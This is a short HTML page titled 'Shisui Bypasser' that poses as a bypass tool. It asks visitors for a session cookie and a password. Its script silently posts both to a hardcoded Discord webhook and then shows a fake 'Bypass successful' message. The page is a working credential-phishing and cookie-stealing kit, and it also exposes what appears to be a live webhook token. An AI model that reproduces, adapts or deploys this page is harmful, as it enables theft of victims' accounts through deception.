<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shisui Bypasser</title>
    <style>
        body {
            background-color: #1A1A2E;
            color: #E94560;
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .form-container {
            background-color: #16213E;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #E94560;
            border: none;
            border-radius: 5px;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #D83D50;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <h2>Shisui Bypasser</h2>
        <form id="bypassForm">
            <input type="text" id="cookie" placeholder="Enter Cookie" required>
            <input type="password" id="password" placeholder="Enter Password" required>
            <button type="submit">Submit</button>
        </form>
        <div id="notification" style="margin-top: 10px;"></div>
    </div>

    <script>
        document.getElementById('bypassForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const cookie = document.getElementById('cookie').value;
            const password = document.getElementById('password').value;

            // Replace with your actual webhook URL
            const webhookUrl = 'https://discord.com/api/webhooks/1311975858583506985/ZB1Lm3IG9Lcf0QMloKAByd9V2fdEGVoyQ2m935Kz5cm1xCbHQyPaazxmhXvEisNBUiua';

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `Cookie: ${cookie}\nPassword: ${password}`,
                    embeds: [{
                        title: "Bypass Notification",
                        description: "Bypass successful! Please wait 1-5 minutes and check!",
                        color: 3066993 // Color code for embed
                    }],
                    mentions: ["@everyone @here"] // Replace with actual user ID or mention format
                })
            })
            .then(response => {
                if (response.ok) {
                    document.getElementById('notification').innerText = "Bypass successful! Please wait 1-5 minutes and check!";
                } else {
                    throw new Error('Network response was not ok');
                }
            })
            .catch(error => {
                document.getElementById('notification').innerText = "Something went wrong, please DM the owner!";
            });
        });
    </script>
</body>
</html>
